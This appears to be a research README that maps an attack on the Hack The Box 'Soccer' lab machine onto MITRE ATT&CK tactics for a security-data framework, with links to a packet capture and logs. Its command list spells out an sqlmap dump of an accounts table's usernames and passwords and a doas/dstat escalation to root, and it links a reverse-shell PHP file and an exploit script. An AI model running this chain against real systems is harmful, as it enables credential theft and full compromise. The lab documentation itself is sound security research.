# Cyber4ML_Framework application in "Soccer" HTB machine

## Framework application details

|Documentation|MITRE ATT&CK|Enterprise|ICS|Network Analysis|Log Analysis|
|-|-|-|-|-|-|
|Yes|Yes|Yes|No|Yes|Yes|

|Attacker Level|Environment|VPN|Attacker IP|Victim IP|
|-|-|-|-|-|
|Average|Linux|Yes|10.10.16.31|10.10.11.194|

**Average:** The knowledge, behavior and attack-timing of the attacker is average.

## Documentation

Documentation of the attack: [Soccer Documentation](https://github.com/stevendamianakis/HackTheBox_Writeups/blob/main/Machines/Soccer/README.MD)

## MITRE ATT&CK mapping

Below, we map the attack to the MITRE ATT&CK Enterprise framework.

| Tactic | Technique | Subtechnique | Command/Script | CVE/CWE |
| - | - | - | - | - |
| Reconnaissance | Active Scanning | Wordlist Scanning | (1) | - |
| Initial Access | Valid Accounts | Local Accounts | - | - |
| Initial Access | Exploit Public-Facing Application | - | [reverse_shell.php](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Soccer/reverse_shell.php) | CVE-2021-45010/CWE-22 |
| Execution | Exploitation for Client Execution | - | [reverse_shell.php](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Soccer/reverse_shell.php) | CVE-2021-45010/CWE-22 |
| Discovery | System Owner/User Discovery | - | (2) | - |
| Discovery | File and Directory Discovery | - | (3) | - |
| Initial Access | Exploit Public-Facing Application | - | (4), [exploit.py](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Soccer/exploit.py) | - |
| Execution | Command and Scripting Interpreter | Unix Shell | (4), [exploit.py](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Soccer/exploit.py) | - |
| Persistence | Valid Accounts | Local Accounts | (5) | - |
| Discovery | Permission Groups Discovery | Local Groups | (6) | - |
| Privilege Escalation | Abuse Elevation Control Mechanism | Setuid and Setgid | (7) | - |


#### Commands/Scripts
- (1)
```
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt
```

- (2)
```
whoami
```

- (3)
```
ls /etc/nginx/sites-enabled
```

- (4)
```
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts -C username,password --dump
```

- (5)
```
ssh player@10.10.11.194
```

- (6)
```
sudo -l
```

- (7)
```
doas -u root /usr/bin/dstat --exploit
```

## Network Analysis

Pcap file of the attack: [Capture File](https://github.com/stevendamianakis/Cyber4ML_Framework/blob/main/HackTheBox/Soccer/attack_capture.pcapng)

## Log Analysis

```
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
```
